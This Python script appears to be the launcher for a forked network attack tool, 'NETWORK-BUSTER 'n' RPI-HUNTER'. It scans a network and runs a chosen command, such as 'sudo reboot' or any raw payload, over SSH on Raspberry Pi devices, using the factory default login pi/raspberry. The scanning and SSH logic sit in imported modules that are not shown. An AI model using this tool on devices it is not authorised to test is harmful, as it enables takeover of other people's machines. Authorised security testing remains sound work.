import argparse

from rpi.hunter import let_the_hunt_begin
from network_buster.buster import bust

from termcolor import colored, cprint

parser = argparse.ArgumentParser()
parser.add_argument('--list', action='store_true',
		help='List available payloads')
parser.add_argument('-u', dest='user', type=str, default='pi',
		help='Username to use when SSH\'ing')
parser.add_argument('-c', dest='creds', type=str, default='raspberry',
		help='Credentials (password) to use when SSH\'ing')

parser.add_argument('--payload', type=str, default='whoami',
		help='(Name of, or raw) payload [ex. reboot or \'whoami\']')

args = parser.parse_args()

payloads={
	'reboot': 'sudo reboot',
}

# List available payloads.
def list_payloads():
	l=0
	print("Available preset payloads:")
	print(f"Specify with {colored('--payload name', 'green')}")
	for key,value in payloads.items():
		print(f"{colored(f'[{key}]', 'yellow')} {colored(value, 'white')}")
	print('\n')

# Prints the introduction message, originally inserted BusesCanFly.
# Kept (but updated) for the their sake!
def intro():
	print("\n")
	print(colored('                       NETWORK-BUSTER \'n\' RPI-HUNTER                       ', 'red'))
	print(colored('-----------------------------------------------------------------------------', 'yellow'))
	print('            Originally by BusesCanFly, Forked & Modified by Team             ')
	print(colored('-----------------------------------------------------------------------------', 'yellow'))
	print("\n")

intro()

if not args.list and bust():
	if args.payload in payloads:
		payload=payloads[args.payload]
	else:
		payload=args.payload
	let_the_hunt_begin(payload)
elif args.list:
    list_payloads()
    